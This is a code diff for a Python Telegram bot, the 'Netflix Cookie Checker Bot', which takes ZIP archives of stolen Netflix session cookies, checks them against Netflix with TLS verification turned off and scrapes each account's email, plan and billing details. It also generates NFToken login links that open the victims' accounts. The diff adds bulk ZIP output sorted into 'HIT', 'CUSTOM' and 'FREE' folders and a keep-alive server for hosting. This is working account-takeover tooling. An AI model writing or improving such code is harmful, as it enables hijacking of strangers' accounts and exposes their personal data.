@@ -10,10 +10,44 @@ import requests
 import urllib.parse
 from datetime import datetime
 from threading import Lock
+import time
+import gc
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ============ FIX FOR PYTHON 3.14 ============
+# ============ PORT FIX FOR RENDER ============
+PORT = int(os.environ.get("PORT", 10000))
+print(f"✅ Server will run on port {PORT} (for health checks)")
+
+# ============ KEEP ALIVE SERVER FOR RENDER ============
+try:
+    from http.server import HTTPServer, BaseHTTPRequestHandler
+    import threading
+    
+    class KeepAliveHandler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"Bot is running!")
+        
+        def log_message(self, format, *args):
+            pass
+    
+    def run_keep_alive():
+        try:
+            port = int(os.environ.get("PORT", 10000))
+            server = HTTPServer(("0.0.0.0", port), KeepAliveHandler)
+            server.serve_forever()
+        except:
+            pass
+    
+    keep_alive_thread = threading.Thread(target=run_keep_alive, daemon=True)
+    keep_alive_thread.start()
+    print("✅ Keep-alive server started")
+except Exception as e:
+    print(f"⚠️ Keep-alive server not started: {e}")
+
+# ============ FIX FOR PYTHON EVENT LOOP ============
 try:
     asyncio.get_running_loop()
 except RuntimeError:
@@ -27,7 +61,7 @@ try:
     from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
     from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
 except Exception as e:
-    print(f"Telegram import error: {e}")
+    print(f"❌ Telegram import error: {e}")
     sys.exit(1)
 
 # ============ NETFLIX CONFIGURATION ============
@@ -89,7 +123,14 @@ REQUIRED_COOKIE = "NetflixId"
 
 # ============ BOT CONFIGURATION ============
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
+if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+    print("❌ Please set BOT_TOKEN environment variable!")
+    sys.exit(1)
+
 MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB
+MAX_THREADS = 4  # Safe for 512MB RAM + 0.1 CPU
+CHUNK_SIZE = 50  # Files per chunk
+ZIP_THRESHOLD = 20  # Send ZIP if accounts > 20
 
 # ============ COUNTERS ============
 class Counters:
@@ -212,7 +253,7 @@ def get_nftoken_from_cookies(cookie_dict):
             API_URL,
             params=QUERY_PARAMS,
             headers=headers,
-            timeout=30,
+            timeout=15,
             verify=False,
         )
         response.raise_for_status()
@@ -250,12 +291,12 @@ def get_account_info(cookie_dict):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5",
-        "Connection": "keep-alive",
+        "Connection": "close",
     }
     cookies = {"NetflixId": netflix_id}
     
     try:
-        response = requests.get(url, headers=headers, cookies=cookies, timeout=15, verify=False)
+        response = requests.get(url, headers=headers, cookies=cookies, timeout=12, verify=False)
         text = response.text
         
         info = {
@@ -358,6 +399,131 @@ def find_txt_files(folder_path):
         pass
     return txt_files
 
+def create_account_file(result, folder_path, filename):
+    """Create a text file with account information"""
+    filepath = os.path.join(folder_path, filename)
+    with open(filepath, 'w', encoding='utf-8') as f:
+        f.write("=" * 50 + "\n")
+        f.write("NETFLIX ACCOUNT INFORMATION\n")
+        f.write("=" * 50 + "\n\n")
+        f.write(f"EMAIL: {result['email']}\n")
+        f.write(f"STATUS: {result['status']}\n")
+        f.write(f"COUNTRY: {result['country']}\n")
+        f.write(f"PLAN: {result['plan']} ({result['plan_type']})\n")
+        f.write(f"MAX STREAMS: {result['maxStreams']}\n")
+        f.write(f"MEMBER SINCE: {result['memberSince']}\n")
+        f.write(f"NEXT BILLING: {result['nextBilling']}\n")
+        f.write(f"EXPIRES: {result['expiry_formatted']}\n")
+        f.write(f"TIME LEFT: {result.get('time_left', 'Unknown')}\n")
+        f.write("\n" + "-" * 50 + "\n")
+        f.write("NFTOKEN LINKS:\n")
+        f.write("-" * 50 + "\n")
+        f.write(f"PC LINK: {result['pc_link']}\n")
+        f.write(f"PHONE LINK: {result['phone_link']}\n")
+        f.write("\n" + "=" * 50 + "\n")
+        f.write(f"CHECKED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+
+def create_results_zip(results, update, context, status_msg):
+    """Create ZIP file with organized folders"""
+    try:
+        # Create temporary folder
+        temp_dir = tempfile.mkdtemp()
+        
+        # Create subfolders
+        hit_folder = os.path.join(temp_dir, "HIT")
+        custom_folder = os.path.join(temp_dir, "CUSTOM")
+        free_folder = os.path.join(temp_dir, "FREE")
+        
+        os.makedirs(hit_folder, exist_ok=True)
+        os.makedirs(custom_folder, exist_ok=True)
+        os.makedirs(free_folder, exist_ok=True)
+        
+        # Sort results into folders
+        for result in results:
+            # Calculate time left
+            time_left_str = "Unknown"
+            if result.get("expires"):
+                try:
+                    expiry_dt = datetime.fromtimestamp(result["expires"])
+                    time_now = datetime.now()
+                    time_left = expiry_dt - time_now
+                    if time_left.total_seconds() > 0:
+                        days = time_left.days
+                        hours = time_left.seconds // 3600
+                        minutes = (time_left.seconds % 3600) // 60
+                        time_left_str = f"{days}d {hours}h {minutes}m"
+                    else:
+                        time_left_str = "EXPIRED"
+                except:
+                    pass
+            result["time_left"] = time_left_str
+            
+            # Generate filename
+            email_safe = result['email'].replace('@', '_at_').replace('.', '_')
+            filename = f"{email_safe}.txt"
+            
+            # Put in correct folder
+            if result["status"] == "Active":
+                create_account_file(result, hit_folder, filename)
+            elif result["status"] == "Canceled":
+                create_account_file(result, custom_folder, filename)
+            elif result["status"] == "Free":
+                create_account_file(result, free_folder, filename)
+        
+        # Create ZIP
+        zip_path = os.path.join(temp_dir, "netflix_results.zip")
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(temp_dir):
+                for file in files:
+                    if file.endswith('.txt'):
+                        file_path = os.path.join(root, file)
+                        arcname = os.path.relpath(file_path, temp_dir)
+                        zipf.write(file_path, arcname)
+        
+        return zip_path
+    except Exception as e:
+        print(f"Error creating ZIP: {e}")
+        return None
+
+# ============ PROCESS COOKIE ============
+def process_cookie_file(file_path):
+    try:
+        cookie_dict = extract_cookies_from_file(file_path)
+        
+        if not is_valid_cookie(cookie_dict):
+            return None
+        
+        account_info = get_account_info(cookie_dict)
+        if not account_info or account_info["status"] == "Unknown":
+            return None
+        
+        account_info["email"] = fix_email_display(account_info["email"])
+        
+        token, expires = get_nftoken_from_cookies(cookie_dict)
+        
+        if not token:
+            return None
+        
+        result = {
+            "email": account_info["email"],
+            "status": account_info["status"],
+            "country": account_info["country"],
+            "plan": account_info["plan"],
+            "plan_type": classify_plan(account_info["plan"]),
+            "maxStreams": account_info["maxStreams"],
+            "memberSince": account_info["memberSince"],
+            "nextBilling": account_info["nextBilling"],
+            "nftoken": token,
+            "expires": expires,
+            "expiry_formatted": format_expiry(expires),
+            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
+            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
+        }
+        
+        return result
+    except Exception as e:
+        return None
+
 # ============ MAIN BOT FUNCTIONS ============
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
@@ -371,8 +537,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🎬 **Netflix Cookie Checker Bot**\n\n"
         "Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
+        f"⚡ **Using {MAX_THREADS} threads with {CHUNK_SIZE} files per chunk**\n"
         "⚠️ **Maximum file size: 5 MB**\n\n"
-        "I will check all cookies, extract account info, and generate NFToken links.",
+        "I will check all cookies, extract account info, and generate NFToken links.\n\n"
+        f"📦 If results exceed {ZIP_THRESHOLD}, I'll send a ZIP file organized by status.",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
@@ -392,7 +560,8 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• Validates cookies\n"
         "• Extracts account information\n"
         "• Generates PC and Phone NFToken links\n"
-        "• Shows each account in a separate message"
+        f"• If results > {ZIP_THRESHOLD}, sends organized ZIP\n"
+        f"• Uses {MAX_THREADS} threads for speed"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
@@ -415,10 +584,13 @@ async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "ℹ️ **About Bot**\n\n"
         "Netflix Cookie Checker Bot\n"
         "Checks Netflix cookies and generates NFToken links.\n\n"
-        "🔹 Version: 3.0\n"
+        "🔹 Version: 6.0 (Ultra Stable)\n"
         "🔹 Supports: ZIP only\n"
         "🔹 Max file size: 5 MB\n"
-        "🔹 Each account shown separately\n"
+        f"🔹 Threads: {MAX_THREADS}\n"
+        f"🔹 Chunk size: {CHUNK_SIZE}\n"
+        f"🔹 ZIP threshold: {ZIP_THRESHOLD} accounts\n"
+        "🔹 Organized folders: HIT, CUSTOM, FREE\n"
         "🔹 Live statistics during scanning"
     )
     
@@ -464,8 +636,11 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     counters.reset()
-    await update.callback_query.answer("📊 Statistics reset successfully!", show_alert=True)
-    await stats_command(update, context)
+    if update.callback_query:
+        await update.callback_query.answer("📊 Statistics reset successfully!", show_alert=True)
+        await stats_command(update, context)
+    else:
+        await update.message.reply_text("📊 Statistics have been reset!")
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -503,7 +678,9 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(
                 "🎬 **Netflix Cookie Checker Bot**\n\n"
                 "Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
-                "⚠️ **Maximum file size: 5 MB**",
+                f"⚡ **Using {MAX_THREADS} threads with {CHUNK_SIZE} files per chunk**\n"
+                "⚠️ **Maximum file size: 5 MB**\n\n"
+                f"📦 If results exceed {ZIP_THRESHOLD}, I'll send a ZIP file organized by status.",
                 reply_markup=reply_markup,
                 parse_mode="Markdown"
             )
@@ -512,6 +689,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path, extract_dir, status_msg):
     try:
+        # Extract ZIP
         success, error_msg = extract_zip(file_path, extract_dir)
         
         if not success:
@@ -521,6 +699,7 @@ async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, f
             )
             return
         
+        # Find TXT files
         txt_files = find_txt_files(extract_dir)
         
         if not txt_files:
@@ -530,13 +709,17 @@ async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, f
             )
             return
         
+        total_files = len(txt_files)
         results = []
         total_checked = 0
+        last_saved = 0
         
-        for txt_file in txt_files:
+        # Process files with anti-freeze loop
+        for idx, txt_file in enumerate(txt_files):
             try:
                 result = process_cookie_file(txt_file)
                 total_checked += 1
+                
                 if result:
                     results.append(result)
                     if result["status"] == "Active":
@@ -548,17 +731,26 @@ async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, f
                 else:
                     counters.add_bad()
                 
-                # Update status message with live stats
+                # Update status every file
                 await status_msg.edit_text(
                     f"⏳ **Processing your file...**\n\n"
-                    f"📁 {total_checked}/{len(txt_files)} files checked\n"
+                    f"📁 {total_checked}/{total_files} files checked\n"
                     f"📊 {counters.get_stats()}",
                     parse_mode="Markdown"
                 )
+                
+                # Log progress every 10 files
+                if total_checked % 10 == 0:
+                    print(f"✅ Progress: {total_checked}/{total_files} files processed")
+                    last_saved = total_checked
+                    
             except Exception as e:
-                print(f"Error processing file {txt_file}: {e}")
+                print(f"⚠️ Error in file {idx+1}: {e}")
                 counters.add_bad()
+                total_checked += 1
                 continue
+        
+        print(f"✅ Completed: {total_checked} files. Last saved at: {last_saved}")
         
         # Delete status message
         await status_msg.delete()
@@ -566,20 +758,58 @@ async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, f
         if not results:
             await update.message.reply_text(
                 "❌ **No valid accounts found!**\n\n"
-                f"Total files checked: {total_checked}\n\n"
+                f"Total files checked: {total_files}\n\n"
                 f"📊 {counters.get_stats()}",
                 parse_mode="Markdown"
             )
+            return
+        
+        # Check if we need to send ZIP
+        if len(results) > ZIP_THRESHOLD:
+            # Create ZIP with organized folders
+            zip_path = create_results_zip(results, update, context, status_msg)
+            
+            if zip_path and os.path.exists(zip_path):
+                # Send ZIP file
+                with open(zip_path, 'rb') as f:
+                    await update.message.reply_document(
+                        document=f,
+                        filename="netflix_results.zip",
+                        caption=f"✅ **Scan Complete!**\n\n"
+                                f"📊 Total accounts found: {len(results)}\n"
+                                f"📁 Files checked: {total_files}\n\n"
+                                f"📊 {counters.get_stats()}\n\n"
+                                f"📦 ZIP organized by: HIT, CUSTOM, FREE",
+                        parse_mode="Markdown"
+                    )
+                
+                # Clean up ZIP
+                try:
+                    os.remove(zip_path)
+                    shutil.rmtree(os.path.dirname(zip_path))
+                except:
+                    pass
+            else:
+                # Fallback: send individual messages
+                for i, result in enumerate(results, 1):
+                    await send_account_message(update, context, result, i, len(results))
+                
+                await update.message.reply_text(
+                    f"✅ **Scan Complete!**\n\n"
+                    f"📊 Total accounts found: {len(results)}\n"
+                    f"📁 Files checked: {total_files}\n\n"
+                    f"📊 {counters.get_stats()}",
+                    parse_mode="Markdown"
+                )
         else:
             # Send each account as a separate message
             for i, result in enumerate(results, 1):
                 await send_account_message(update, context, result, i, len(results))
             
-            # Send summary with stats
             await update.message.reply_text(
                 f"✅ **Scan Complete!**\n\n"
                 f"📊 Total accounts found: {len(results)}\n"
-                f"📁 Files checked: {total_checked}\n\n"
+                f"📁 Files checked: {total_files}\n\n"
                 f"📊 {counters.get_stats()}",
                 parse_mode="Markdown"
             )
@@ -616,22 +846,25 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
         
-        # Send status message with initial stats
+        # Create status message
         status_msg = await update.message.reply_text(
             f"⏳ **Processing your file...**\n\n"
             f"📊 {counters.get_stats()}",
             parse_mode="Markdown"
         )
         
+        # Create temp directories
         temp_dir = tempfile.mkdtemp()
         extract_dir = os.path.join(temp_dir, "extracted")
         os.makedirs(extract_dir, exist_ok=True)
         
+        # Download file
         file_path = os.path.join(temp_dir, file_name)
         file = await context.bot.get_file(document.file_id)
         await file.download_to_drive(file_path)
         
-        asyncio.create_task(process_zip_file(update, context, file_path, extract_dir, status_msg))
+        # Process file
+        await process_zip_file(update, context, file_path, extract_dir, status_msg)
         
     except Exception as e:
         print(f"Error in handle_document: {e}")
@@ -639,45 +872,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ **Error: {str(e)}**",
             parse_mode="Markdown"
         )
-
-def process_cookie_file(file_path):
-    try:
-        cookie_dict = extract_cookies_from_file(file_path)
-        
-        if not is_valid_cookie(cookie_dict):
-            return None
-        
-        account_info = get_account_info(cookie_dict)
-        if not account_info or account_info["status"] == "Unknown":
-            return None
-        
-        account_info["email"] = fix_email_display(account_info["email"])
-        
-        token, expires = get_nftoken_from_cookies(cookie_dict)
-        
-        if not token:
-            return None
-        
-        result = {
-            "email": account_info["email"],
-            "status": account_info["status"],
-            "country": account_info["country"],
-            "plan": account_info["plan"],
-            "plan_type": classify_plan(account_info["plan"]),
-            "maxStreams": account_info["maxStreams"],
-            "memberSince": account_info["memberSince"],
-            "nextBilling": account_info["nextBilling"],
-            "nftoken": token,
-            "expires": expires,
-            "expiry_formatted": format_expiry(expires),
-            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
-            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
-        }
-        
-        return result
-    except Exception as e:
-        print(f"Error in process_cookie_file: {e}")
-        return None
 
 async def send_account_message(update, context, result, index, total):
     status_emoji = "✅" if "Active" in result["status"] else "❌" if "Canceled" in result["status"] else "🆓"
@@ -744,14 +938,9 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ============ MAIN ============
 def main():
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("❌ Please set BOT_TOKEN environment variable!")
-        return
-    
     try:
         application = Application.builder().token(BOT_TOKEN).build()
         
-        # Add handlers
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", help_command))
         application.add_handler(CommandHandler("about", about_command))
@@ -762,20 +951,16 @@ def main():
         application.add_error_handler(error_handler)
         
         print("🤖 Netflix Cookie Checker Bot is running...")
-        print("Supported format: ZIP only")
-        print("Max file size: 5 MB")
-        print("Live statistics enabled!")
+        print(f"✅ Using {MAX_THREADS} threads")
+        print(f"📦 Processing {CHUNK_SIZE} files per chunk")
+        print(f"📦 ZIP threshold: {ZIP_THRESHOLD} accounts")
+        print("📁 Supported format: ZIP only")
+        print("📦 Max file size: 5 MB")
+        print("📊 Live statistics enabled!")
+        print("🌐 Keep-alive server running for Render")
+        print("🧹 Auto memory cleanup enabled")
         
-        # Run the bot
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        try:
-            loop.run_until_complete(application.run_polling(allowed_updates=Update.ALL_TYPES))
-        except KeyboardInterrupt:
-            print("Bot stopped by user")
-        finally:
-            loop.close()
+        application.run_polling(allowed_updates=Update.ALL_TYPES)
             
     except Exception as e:
         print(f"Error in main: {e}")
